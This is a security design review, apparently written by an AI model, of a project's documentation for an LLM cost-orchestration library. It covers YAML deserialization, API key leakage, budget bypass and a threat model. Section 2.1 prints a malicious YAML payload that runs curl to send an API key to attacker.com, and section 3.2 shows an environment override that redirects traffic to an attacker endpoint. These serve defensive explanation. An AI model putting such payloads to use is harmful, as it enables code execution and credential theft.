# Security Review: Cost-Optimized AI Orchestration

**Reviewer**: LLM Security Reviewer (Claude Opus)
**Date**: April 3, 2026
**Documents Reviewed**: All project documentation in `docs/`

---

## 1. Executive Summary

The security posture of this project is **adequate for a local-first library** but **insufficient for the multi-tenant, team-feature, and server modes described in Phases 3-4**. The design correctly identifies the major asset to protect (API keys and budget), and the "prompt logging off by default" decision is good. However, there are several design-level vulnerabilities that should be addressed before code is written: YAML deserialization risks, API key exposure in config files and error messages, lack of prompt secret scanning, exploitable fail-open budget mode, and an underspecified threat model for the multi-tenant architecture.

**Overall security assessment**: Medium risk for Phase 1-2 (local library), High risk for Phase 3-4 (server/team mode) without additional security design work.

---

## 2. Critical Vulnerabilities (Must Fix Before Code Release)

### 2.1 YAML Deserialization: Code Execution Risk

**Severity**: Critical
**Location**: SYSTEM_ARCHITECTURE.md:554-622, TECHNICAL_DESIGN_DECISIONS.md:1340-1373

The configuration system uses YAML files. If `yaml.load()` (without `Loader=SafeLoader`) is used anywhere instead of `yaml.safe_load()`, a malicious `.cost_orchestrator.yaml` file can execute arbitrary Python code.

Example attack:
```yaml
# Malicious .cost_orchestrator.yaml
version: !!python/object/apply:os.system ['curl attacker.com/steal?key=$OPENROUTER_API_KEY']
```

**The documents never explicitly mandate `yaml.safe_load()`**. The SECURITY_REVIEW_REQUEST.md:143 asks "Is `pyyaml` safe? Should we use `safe_load` exclusively?" — the fact that this is a question rather than a mandate is itself the vulnerability.

**Recommendation**:
1. **Mandate `yaml.safe_load()` exclusively** in a security policy document and enforce via linting (e.g., `bandit` check B506).
2. Better yet, switch to TOML (`tomllib` in Python 3.11+), which has no code execution surface.
3. If YAML is kept, use `pydantic-settings` to load and validate YAML into typed models — this provides both deserialization safety and validation.

### 2.2 API Key Exposure in Configuration Files

**Severity**: Critical
**Location**: SYSTEM_ARCHITECTURE.md:614-615, USER_STORY.md:54-62, USER_STORY.md:96-113

The user story instructs users to put API keys in:
1. `.bashrc` (USER_STORY.md:57-58): `echo "export OPENROUTER_API_KEY='your-key-here'" >> ~/.bashrc`
2. YAML config files (USER_STORY.md:96-113, SYSTEM_ARCHITECTURE.md:572-573)
3. Environment variables referenced in YAML: `api_key: "$OPENROUTER_API_KEY"` (SYSTEM_ARCHITECTURE.md:615)

The `.cost_orchestrator.yaml` file lives in the project root and will be committed to git unless `.gitignore` is configured. **There is no mention of a `.gitignore` template or warning about committing config files with keys.**

**Recommendation**:
1. **Never store API keys in YAML config files**. The config file should reference environment variable names, not values: `api_key_env: "OPENROUTER_API_KEY"` (not `api_key: "$OPENROUTER_API_KEY"`).
2. On `orchestrator init`, generate a `.gitignore` entry for `.cost_orchestrator.yaml` (or at minimum warn users).
3. Add a pre-commit hook or CI check that scans for API keys in committed files.
4. Support system keyrings (`keyring` Python package) for key storage.
5. The `OPENROUTER_API_KEY` in the YAML string `"$OPENROUTER_API_KEY"` requires the orchestrator to do shell-style variable expansion on YAML values. This is a custom behavior that should be documented and carefully implemented to avoid injection.

### 2.3 API Keys in Error Messages and Stack Traces

**Severity**: High
**Location**: Design gap — not addressed in any document

When a provider call fails with an authentication error, the HTTP client library (httpx, aiohttp) may include the full request headers (including `Authorization: Bearer sk-xxx...`) in the exception message or traceback. If these exceptions are:
- Logged to a file
- Displayed to the user
- Sent to an OTel collector
- Included in a bug report

...the API key is exposed.

**Recommendation**:
1. Wrap all provider calls with a sanitizing exception handler that strips `Authorization` headers and any string matching API key patterns (e.g., `sk-[a-zA-Z0-9]+`, `or-[a-zA-Z0-9]+`) from error messages before logging or propagating.
2. Add a `SecretSanitizer` utility that is applied to all log output and all OTel span attributes.
3. Write tests that verify API keys are never present in log output for all error paths.

---

## 3. Design Concerns (Should Address in Design Phase)

### 3.1 Fail-Open Budget Mode Is Exploitable

**Severity**: Medium-High
**Location**: TECHNICAL_DESIGN_DECISIONS.md:323-408

The `fail_open_with_alert` mode (TECHNICAL_DESIGN_DECISIONS.md:331-337) allows up to 5 untracked calls with a $2.00 emergency cap when storage is unavailable. If an attacker can make storage unavailable (e.g., by corrupting the SQLite file, filling the disk, or killing the PostgreSQL connection), they can bypass budget enforcement entirely.

Attack scenario:
1. Attacker (or malicious code in a dependency) corrupts `orchestrator.db`
2. All budget checks fail with `StorageError`
3. `fail_open_with_alert` allows 5 untracked calls
4. If the attacker triggers this repeatedly (by corrupting the DB after each recovery), they get unlimited untracked calls in batches of 5

The `_get_untracked_count` and `_increment_untracked` methods (TECHNICAL_DESIGN_DECISIONS.md:382-385) store their state somewhere — but where? If in memory, a process restart resets the count. If in the (now-broken) storage, they can't read it.

**Recommendation**:
1. Store untracked call count in a separate, simpler mechanism (e.g., a local file, not the main DB).
2. Add a hard daily maximum that is enforced independently of the database (e.g., a rate limiter based on wall-clock time and an atomic file counter).
3. Document clearly that `fail_open` modes accept budget overrun risk and should not be used in cost-sensitive environments.

### 3.2 Environment Variable Injection via Config

**Severity**: Medium
**Location**: TECHNICAL_DESIGN_DECISIONS.md:1364-1372

The `_load_env_vars` method reads all `COST_ORCH_*` environment variables and converts them to nested config dictionaries using `_` as the separator. This means:
- `COST_ORCH_TIERS_L0_CODER_MODEL=malicious-model` overrides the L0 model
- `COST_ORCH_TIERS_L0_CODER_BASE_URL=https://attacker.com/v1` redirects L0 traffic to an attacker's endpoint

If an attacker can set environment variables (e.g., via a compromised CI pipeline, a shared server, or a malicious `.env` file), they can redirect all LLM traffic to their own endpoint and capture prompts.

**Recommendation**:
1. Validate all `base_url` values against an allowlist of known provider URLs (or at minimum, warn if a URL doesn't match known providers).
2. Log a warning when environment variables override config file values, so the user can detect unexpected overrides.
3. Consider a `--strict-config` mode that ignores environment variables entirely.

### 3.3 Prompt Data Leakage Through OTel

**Severity**: Medium
**Location**: TECHNICAL_DESIGN_DECISIONS.md:584-638

The OTel instrumentation sets `task.description` as a span attribute (TECHNICAL_DESIGN_DECISIONS.md:589):

```python
"task.description": description,
```

If the task description contains sensitive information (source code, business logic, credentials accidentally pasted), this data flows to wherever the OTel exporter is configured — potentially a third-party cloud service (Honeycomb, Datadog, Grafana Cloud).

**Recommendation**:
1. Do not include `task.description` in span attributes by default. Make it opt-in: `observability.include_task_description: false`.
2. Apply a length limit (e.g., 200 chars) to any text attribute sent to OTel.
3. Add a configurable `attribute_allowlist` for OTel exporters that limits which attributes are sent externally.
4. Add a `SensitiveDataScrubber` that checks span attributes for patterns that look like API keys, passwords, or PII before export.

### 3.4 No Prompt Secret Scanning

**Severity**: Medium
**Location**: Not addressed anywhere

Developers frequently paste code containing secrets into LLM prompts. The orchestrator processes these prompts and sends them to LLM providers. There is no mechanism to detect and warn about secrets in prompts before they are sent to external APIs.

**Recommendation**:
1. Add an optional `prompt_scanner` that checks outgoing prompts for common secret patterns (AWS keys, private keys, database connection strings, etc.) using regex patterns similar to `detect-secrets` or `trufflehog`.
2. When a potential secret is detected: warn the user, optionally block the request, and never log the prompt content.
3. This should be off by default (to avoid false positives blocking work) but easily enabled.

### 3.5 No Input Validation on Provider Responses

**Severity**: Medium
**Location**: Design gap

The system receives responses from LLM providers and processes them. What happens if:
- A compromised/malicious local LM Studio model returns a response claiming 0 tokens used (cost evasion)?
- A response contains embedded instructions that affect the orchestrator's decision-making (prompt injection against the orchestrator itself)?
- A response is extremely large (100MB+), causing memory exhaustion?

**Recommendation**:
1. Validate token counts from provider responses: if claimed tokens are significantly less than local estimate, log a warning.
2. Set a maximum response size limit per provider call.
3. Never use LLM response content to make orchestrator control flow decisions (e.g., don't let a response say "escalate me to L3").

---

## 4. Recommendations (Specific Improvements)

### 4.1 Implement a Secret Detection Pipeline

```python
class SecretScanner:
    PATTERNS = [
        (r'sk-[a-zA-Z0-9]{20,}', 'OpenAI API Key'),
        (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
        (r'-----BEGIN (RSA |EC )?PRIVATE KEY-----', 'Private Key'),
        (r'[a-zA-Z0-9+/]{40,}={0,2}', 'Base64 encoded (possible secret)'),
        # ... more patterns
    ]

    def scan(self, text: str) -> list[SecretFinding]:
        findings = []
        for pattern, name in self.PATTERNS:
            if re.search(pattern, text):
                findings.append(SecretFinding(type=name, location="prompt"))
        return findings
```

### 4.2 Add Security Headers to REST API

When the REST API is implemented (Phase 3+), ensure:
- CORS is restricted (not `*`)
- `X-Content-Type-Options: nosniff`
- `Strict-Transport-Security` headers
- Rate limiting on all endpoints
- CSRF protection for state-changing operations
- Authentication on all API endpoints (no anonymous access)

### 4.3 Implement Dependency Scanning in CI

```yaml
# GitHub Actions workflow
- name: Dependency Security Scan
  uses: pypa/gh-action-pip-audit@v1
  with:
    vulnerability-service: osv

- name: Static Analysis
  run: |
    pip install bandit
    bandit -r src/ -f json -o bandit-report.json

- name: Secret Scanning
  uses: trufflesecurity/trufflehog@v3
```

### 4.4 Create a SECURITY.md and Vulnerability Disclosure Process

The project should have:
- `SECURITY.md` in the repo root
- A vulnerability disclosure process (e.g., GitHub Security Advisories)
- A security policy stating supported versions
- A PGP key or secure email for reporting vulnerabilities

### 4.5 Monetary Calculations Must Use Decimal, Not Float

**Location**: Throughout all documents (PRD.md:276, SYSTEM_ARCHITECTURE.md:295-296)

All cost calculations use `float` (`cost_usd: float`). Floating-point arithmetic is notoriously imprecise for monetary calculations:

```python
>>> 0.1 + 0.2
0.30000000000000004
```

Over thousands of transactions, these errors accumulate.

**Recommendation**: Use `decimal.Decimal` for all monetary values. Store costs as integers in the smallest unit (e.g., microdollars = millionths of a dollar) in the database.

---

## 5. Threat Model

### 5.1 Assets

| Asset | Value | Location |
|-------|-------|----------|
| API Keys | High — direct financial exposure | Env vars, memory, config files |
| Budget State | High — controls spending | SQLite/PostgreSQL |
| Prompt Content | Variable — may contain source code, PII | Memory, optionally logs/DB |
| Response Content | Variable — may contain generated code | Memory, optionally logs/DB |
| Configuration | Medium — controls routing and behavior | YAML files, env vars |
| Execution History | Low-Medium — usage patterns | Database |

### 5.2 Threat Actors

| Actor | Motivation | Capability |
|-------|-----------|------------|
| Malicious dependency | Supply chain attack | Code execution in process |
| Compromised CI/CD | Credential theft | Environment variable access |
| Malicious local user | Unauthorized LLM usage | File system access, env var manipulation |
| Compromised LLM provider | Data exfiltration | Response manipulation |
| Insider (team mode) | Budget abuse | Legitimate access, configuration changes |

### 5.3 Attack Vectors and Mitigations

| # | Attack Vector | Target Asset | Severity | Mitigation |
|---|-------------|-------------|----------|------------|
| 1 | YAML deserialization | Code execution | Critical | Use `safe_load()` or TOML |
| 2 | Config file committed to git | API Keys | Critical | `.gitignore`, pre-commit hooks |
| 3 | API key in error message/log | API Keys | High | Secret sanitizer on all output |
| 4 | Env var override of base_url | Prompt Content | High | URL allowlist, override warnings |
| 5 | Storage corruption → fail_open | Budget State | Medium-High | Separate untracked counter, hard daily max |
| 6 | Prompt data in OTel spans | Prompt Content | Medium | Attribute allowlist, opt-in descriptions |
| 7 | Concurrent budget race condition | Budget State | Medium | Budget reservations (see Architecture Review) |
| 8 | Malicious model response (false token count) | Budget State | Medium | Cross-validate token counts |
| 9 | Large response → memory exhaustion | Availability | Medium | Response size limits |
| 10 | Provider rate limit exhaustion | Availability | Low-Medium | Per-provider rate limiting at orchestrator level |

---

## 6. Security Checklist

### Priority: Critical (Must be in Phase 1)

- [ ] Use `yaml.safe_load()` exclusively (or switch to TOML)
- [ ] Never store API key values in config files (reference env var names only)
- [ ] Generate `.gitignore` on init that excludes config files with potential secrets
- [ ] Sanitize all error messages and log output to remove API key patterns
- [ ] Use `Decimal` for all monetary calculations
- [ ] Validate and sanitize all OTel span attributes before export
- [ ] Set response size limits on provider calls

### Priority: High (Should be in Phase 1-2)

- [ ] Add `bandit` and `pip-audit` to CI pipeline
- [ ] Create `SECURITY.md` with vulnerability disclosure process
- [ ] Validate provider URLs against known patterns (warn on unknown)
- [ ] Log warnings when env vars override config file values
- [ ] Implement prompt/response data never logged unless explicitly opted in (verify all code paths)
- [ ] Add per-task cost limit as a budget enforcement feature

### Priority: Medium (Should be in Phase 2-3)

- [ ] Implement optional prompt secret scanning
- [ ] Add attribute allowlist for external OTel exporters
- [ ] Implement budget reservation pattern to prevent race conditions
- [ ] Add separate untracked-call counter that doesn't depend on main storage
- [ ] Implement per-provider request rate limiting

### Priority: Low (Phase 3+, if server mode is built)

- [ ] RBAC implementation for multi-user mode
- [ ] CORS and security headers for REST API
- [ ] CSRF protection for web dashboard
- [ ] Tenant isolation audit for multi-tenant mode
- [ ] Penetration testing before multi-tenant release

---

## 7. Answers to Specific Questions

### Q1: What is the most likely security vulnerability in this system?

**API key exposure through logs, error messages, or accidentally committed config files.** This is the most likely because it requires no attacker — just normal developer mistakes. A developer puts their key in the YAML file, commits it, pushes to GitHub, and their key is scraped within minutes.

### Q2: If you were attacking this system, what would you target first?

The environment variable override of `base_url`. Set `COST_ORCH_TIERS_L0_CODER_BASE_URL=https://my-proxy.com/v1` and intercept all prompts. On a shared CI server or compromised development machine, this is trivial.

### Q3: Are we over-engineering or under-engineering security?

**Under-engineering for the basics, over-engineering for advanced features.** The docs discuss RBAC, encryption at rest, GDPR compliance, and audit logging — but don't mandate `yaml.safe_load()` or specify how to prevent API key leakage. Fix the fundamentals first.

### Q4: Should we have a security.txt and vulnerability disclosure process?

**Yes, absolutely.** This is an open-source project that handles financial credentials (API keys with billing access). A `SECURITY.md` and GitHub Security Advisories are the minimum. Do this in Phase 1, Week 1.

### Q5: What security testing should be in CI?

1. **Static analysis**: `bandit` for Python security issues
2. **Dependency scanning**: `pip-audit` or `safety` for known vulnerabilities
3. **Secret scanning**: `trufflehog` or `detect-secrets` on all committed files
4. **YAML safety**: Custom check that `yaml.load()` (without SafeLoader) never appears in code

### Q6: Are there compliance requirements?

For the library itself (Phase 1-2): minimal. Users are responsible for their own compliance.

For team/server mode (Phase 3+): if users store team member data, GDPR applies. If the system stores prompt content (opt-in), data subject access requests and right to deletion apply. The data retention policy (TECHNICAL_DESIGN_DECISIONS.md:959-1050) is a good start but needs review by someone with GDPR expertise.

### Q7: What's the blast radius if an API key is compromised?

Depends on the provider, but typically:
- **OpenAI**: Full access to the account's billing. Attacker can run any model, any volume.
- **Anthropic**: Same as OpenAI.
- **OpenRouter**: Depends on account settings; may have per-key spending limits.

**Mitigation**: Document how users should set up per-project API keys with spending limits at the provider level. This is the most effective blast radius reduction and costs nothing to implement (it's documentation).
